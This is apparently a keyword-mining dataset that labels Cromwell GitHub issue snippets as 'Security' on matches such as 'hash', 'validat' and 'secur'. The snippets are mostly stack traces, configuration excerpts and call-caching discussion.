Security,ize(File.scala:502); 	at cromwell.core.path.BetterFileMethods.size(BetterFileMethods.scala:323); 	at cromwell.core.path.BetterFileMethods.size$(BetterFileMethods.scala:323); 	at cromwell.filesystems.gcs.GcsPath.size(GcsPathBuilder.scala:179); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$fileSize$2(ReadLikeFunctions.scala:18); 	at scala.runtime.java8.JFunction0$mcJ$sp.apply(JFunction0$mcJ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$fileSize$1(ReadLikeFunctions.scala:18); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$validateFileSizeIsWithinLimits$1(ReadLikeFunctions.scala:54); 	at scala.util.Success.flatMap(Try.scala:247); 	at cromwell.backend.wdl.ReadLikeFunctions.validateFileSizeIsWithinLimits(ReadLikeFunctions.scala:53); 	at cromwell.backend.wdl.ReadLikeFunctions.validateFileSizeIsWithinLimits$(ReadLikeFunctions.scala:51); 	at cromwell.backend.standard.StandardExpressionFunctions.validateFileSizeIsWithinLimits(StandardExpressionFunctions.scala:22); 	at cromwell.backend.wdl.ReadLikeFunctions.read_string(ReadLikeFunctions.scala:83); 	at cromwell.backend.wdl.ReadLikeFunctions.read_string$(ReadLikeFunctions.scala:81); 	at cromwell.backend.standard.StandardExpressionFunctions.read_string(StandardExpressionFunctions.scala:22); 	at sun.reflect.GeneratedMethodAccessor360.invoke(Unknown Source); 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43); 	at java.lang.reflect.Method.invoke(Method.java:498); 	at wdl4s.wdl.expression.WdlFunctions.$anonfun$getFunction$1(WdlFunctions.scala:11); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:190); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:56); 	at wdl4s.wdl.WdlExpression$.evaluate(WdlExpression.scala:91); 	at wdl4s.wdl.WdlExpression.evaluate(WdlExpression.scala:172); 	at wdl4s.wdl.WdlTask.$anonfun$evaluateOutputs$2(WdlTask.scala:188); 	... 34 more; Caused by: com.google.api,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:6656,validat,validateFileSizeIsWithinLimits,6656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['validat'],['validateFileSizeIsWithinLimits']
Security,java.lang.Exception: Unauthorized to get docker hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6674:48,hash,hash,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674,1,['hash'],['hash']
Security,java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.runAndResetNeedTask(ReferenceCountedOpenSslEngine.java:1496); at io.grpc.netty.shaded.io,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7261,Validat,Validator,7261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['Validat'],['Validator']
Security,"k that basically took in one file input and output a glob of files. We first tried this with a glob where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(Abstr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:1038,secur,security,1038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"ka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972); at ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2348,secur,security,2348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"ker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-defined hashing strategy.; check-sibling-md5: false; }; }; }; }; }; }; }. database {; db.url = ""jdbc:mysql://mysql-db/cromwell_db?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true""; db.user = ""cromwell""; db.password = ""cromwell""; db.driver = ""com.mysql.cj.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; db.connectionTimeout = 15000; }; ```. and here is my cormwell dockerfile:. ```; FROM broadinstitute/cromwell:develop. RUN git clone https://github.com/vishnubob/wait-for-it.git; RUN mkdir cromwell-working-dir; WORKDIR cromwell-working-dir. COPY ./app-config /app-config. ENTRYPOINT [""/bin/sh"", ""-c""]; ```. when i submit a wdl did not use docker it was ok. but when i submit a wdl need to use docker, a error apear.; ```; /cromwell-working-dir/cromwell-executions/RNAseq/26e3c339-39d3-442f-b93e-8269dc7f9fa6/call-fastp_pe/shard-7/execution/script.submit: line 2: docker: command not found; ```. Is that means I shoud install a docker deamon in cromwell dockerfile or i cloud change some config setting to fix this. please help.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:2479,password,password,2479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['password'],['password']
Security,"ker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/script: Permission denied; +++ cat /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; ++ docker wait 021d88f941ea0a813e0ea756700f59a065a6aac90cc8628cd062f4047b3ea84d; + rc=126; ++ cat /home/jaruga/git/dockstore-cli-docker-test/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/docker_cid; + docker rm 021d88f941ea0a813e0ea756700f59a065a6aac90cc8628cd062f4047b3ea84d; 021d88f941ea0a813e0ea756700f59a065a6aac90cc8628cd062f4047b3ea84d; + exit 126; ```. This is related to the docker run volume mount option requiring `:z` or `:Z`.; > https://docs.docker.com/engine/reference/commandline/run/; > Labeling systems like SELinux require that proper labels are placed on volume content mounted into a container. Without a label, the security system might prevent the processes running inside the container from using the content. By default, Docker does not change the labels set by the OS.; >; > To change the label in the container context, you can add either of two suffixes :z or :Z to the volume mount. These suffixes tell Docker to relabel file objects on the shared volumes. The z option tells Docker that two containers share the volume content. As a result, Docker labels the content with a shared content label. Shared volume labels allow all containers to read/write content. The Z option tells Docker to label the content with a private unshared label. Only the current container can use a private volume. Now I replaced the suffixes "":delegated"" with `:z`. ```; $ git diff; diff --git a/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/script.submit b/cromwell-executions/HelloWorldWithDocker/3d200d74-77eb-45d8-8fe6-b41b14aab6f6/call-WriteGreeting/execution/script.submit; index 063b374..f37a650 10",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6905:3754,secur,security,3754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6905,1,['secur'],['security']
Security,"kets. The outputs are copied out of the execution folder after the workflow completes. These files we cache by reference, and that works fine, and we want to keep the inputs and outputs forever. However we have a large volume of intermediate files which end up in our cromwell-executions bucket. We love caching. It works great. A fully cached workflow runs in about 5 minutes at next to no cost. Fresh workflows (no cache hits) cost on the order of $0.50 for typical examples, and run for a few hours. Object storage has been eating us up, though. We've worked out that for a single one of these workflows the break even point at which it's cheaper to rerun it than to save it and cache it is about a week. If you take into account that we re-run workflows only a small part of the time, it probably doesn't even pay to keep the execution folders at all (except in the intangible wall clock time). [And nearline / coldline makes no sense at all. Each cached file is accessed multiple times which makes cached runs way way more expensive than fresh runs.]. We’ve examined the pipeline, and we see that we could reduce the size of intermediate outputs, from 126G to 40G by combining separate tasks, which obviates the need to make the large file an output of the first task and input to the second. This leads me to a question for the deep thinkers in Cromwell caching. I want to ask if something makes sense in theory, for the purpose of making caching more feasible for us. Suppose I took the two tasks I spoke of, one of which “passes” a large file to the second, and made them into a sub-workflow. And I mark the large files as “too big to keep” so they Cromwell would strip them out of the execution folder after the run completed. If caching were to work by looking at the inputs and outputs of the sub-workflow, and not at each task one by one, then it would be possible to cache the entire sub-workflow. Right?. Let’s say this sounds theoretically possible. Wouldn’t it be possible then, to sk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064:2205,access,accessed,2205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064,1,['access'],['accessed']
Security,"kflow-main:-1:1 [788d8048]: Starting main.ethnic_sample_lists_task; [2022-12-15 21:28:08,40] [info] BackgroundConfigAsyncJobExecutionActor [788d8048main.load_shared_covars:NA:1]: job id: 1902061; [2022-12-15 21:28:08,43] [info] BackgroundConfigAsyncJobExecutionActor [788d8048main.load_shared_covars:NA:1]: Status change from - to WaitingForReturnCode; [2022-12-15 21:28:13,68] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 1; [2022-12-15 21:28:13,69] [info] BT-322 788d8048:main.ethnic_sample_lists_task:-1:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:13,85] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.ethnic_sample_lists_task:-1:1-20000000033 [788d8048main.ethnic_sample_lists_task:NA:1]: Unrecognized runtime attribute keys; : shortTask, dx_timeout; [2022-12-15 21:28:13,85] [info] BT-322 788d8048:main.ethnic_sample_lists_task:-1:1 cache hit copying success with aggregated hashes: initial = B09218865D7CA13056B00F9F90E94675, file = 66CE4C8C9D1761D150F95616CE84D5F3.; [2022-12-15 21:28:13,85] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.ethnic_sample_lists_task:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:14,50] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.ethnic_sample_lists_task' (scatter index: None, attempt 1); [2022-12-15 21:28:20,55] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Starting main.all_qced_sample_lists (6 shards); [2022-12-15 21:28:23,68] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 6; [2022-12-15 21:28:23,69] [info] BT-322 788d8048:main.all_qced_sample_lists:2:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:23,70] [info] BT-322 788d8048:main.all_qc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:40381,hash,hashes,40381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,kflowDefinition$.convertGraphElements(WorkflowDefinitionElementToWomWorkflowDefinition.scala:63); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertOuterScatter$10(ScatterElementToGraphNode.scala:72); scala.Function3.$anonfun$tupled$1(Function3.scala:35); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple3$.flatMapN$extension(ErrorOr.scala:53); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convertOuterScatter(ScatterElementToGraphNode.scala:65); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convert(ScatterElementToGraphNode.scala:33); wdl.draft3.transforms.wdlom2wom.graph.WorkflowGraphElementToGraphNode$.convert(WorkflowGraphElementToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); scala.collection.immutable.List.foldLeft(List.scala:86); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkfl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:3975,validat,validation,3975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,"kflows, and having some trouble identifying a config that will work for the following requirements:. - Using containers (both Singularity and Docker); - Initial localisation strategy: `[hard-link, cached-copy]`; - Local SFS environment; - My input files can be fairly large (~250GB per Bam with up to 16 Bams). . If I can get this working, I'll happily document and update the CallCaching documentation page with what I've found. ## Background information. Version: Cromwell-47. Documentation:; - https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; - https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options; - https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem. Cache duplication strategies:; - `hard-link`; - `soft-link` - This strategy is not applicable for tasks which specify a Docker image and will be ignored.; - `copy`; - ~`cached-copy`~ - This is non-cache duplication strategy. Cache hashing strategies:; - `file` - (default) computes an md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:1259,hash,hashing,1259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,2,['hash'],"['hash', 'hashing']"
Security,"l (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. #docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json"". # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""us-central1"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a signifi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:2924,authoriz,authorization,2924,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['authoriz'],['authorization']
Security,"l want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; AWS ; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs; ; ![AWS-Batch](https://user-images.githubusercontent.com/25282254/153039990-0d0b2c96-a33b-454f-9617-aee83137337a.PNG); [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026009/Cromwell-Error.docx); ; <!-- Paste/Attach your workflow if possible: -->; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; include required(classpath(""application"")). aws {. application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3.auth = ""default""; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; docker {; hash-lookup {; enabled = false; # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub and gcr; method = ""remote""; }; }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; concurrent-job-limit = 1000; root = ""s3://cromwell-aws-hello/cromwell-execution""; auth = ""default""; default-runtime-attributes {; queueArn = ""arn:aws:batch:us-east-1:XXXXXXXXX:job-queue/python-batch"" ,; scriptBucketName = ""cromwell-aws-hello"" ; }; filesystems {; s3 {; auth = ""default""; }; }; # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in the cloud.; slow-job-warning-time: 24 hours; }; }; }; }. [Cromwell-Error.docx](https://github.com/broadinstitute/cr",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671:2082,hash,hash-lookup,2082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671,2,['hash'],"['hash-lookup', 'hashes']"
Security,"l.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:639); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:639); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:639); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:954); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:946); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); ... 6 more; Caused by: common.exception.AggregatedMessageException: Error(s):; Cannot interpolate Array[Nothing] into a command string with attribute set [PlaceholderAttributeSet(None,None,None,None)]; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:574); ... 35 more; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:6106,validat,validation,6106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,8,"['Validat', 'validat']","['Validation', 'ValidationTry', 'validation']"
Security,"l::standardize_column_names_again::kshakir: ChangeSet changesets/standardize_column_names_again.xml::standardize_column_names_again::kshakir ran successfully in 54ms; 2018-06-07 12:16:10,880 INFO - Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; 2018-06-07 12:16:10,896 INFO - [RenameWorkflowOptionsInMetadata] 100%; 2018-06-07 12:16:10,896 INFO - changelog.xml: changesets/rename_workflow_options_in_metadata.xml::rename_workflow_options_in_metadata::tjeandet: RenameWorkflowOptionsInMetadata complete.; 2018-06-07 12:16:10,896 INFO - changelog.xml: changesets/rename_workflow_options_in_metadata.xml::rename_workflow_options_in_metadata::tjeandet: ChangeSet changesets/rename_workflow_options_in_metadata.xml::rename_workflow_options_in_metadata::tjeandet ran successfully in 17ms; 2018-06-07 12:16:10,898 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::encrypt_workflow_store_entry_workflow_options::kshakir: EncryptWorkflowStoreEntryWorkflowOptions complete.; 2018-06-07 12:16:10,899 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::encrypt_workflow_store_entry_workflow_options::kshakir: ChangeSet changesets/encrypt_and_clear_workflow_options.xml::encrypt_workflow_store_entry_workflow_options::kshakir ran successfully in 1ms; 2018-06-07 12:16:10,900 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::clear_metadata_entry_workflow_options::kshakir: ClearMetadataEntryWorkflowOptions complete.; 2018-06-07 12:16:10,900 INFO - changelog.xml: changesets/encrypt_and_clear_workflow_options.xml::clear_metadata_entry_workflow_options::kshakir: ChangeSet changesets/encrypt_and_clear_workflow_options.xml::clear_metadata_entry_workflow_options::kshakir ran successfully in 0ms; 2018-06-07 12:16:10,902 INFO - changelog.xml: changesets/sub_workflow_store.xml::SUB_WORKFLOW_STORE_ENTRY::tjeandet: Table SUB_WORKFLOW_STORE_ENTRY created; 2018-06-07 12:16:10,902 ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:69912,Encrypt,EncryptWorkflowStoreEntryWorkflowOptions,69912,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['Encrypt'],['EncryptWorkflowStoreEntryWorkflowOptions']
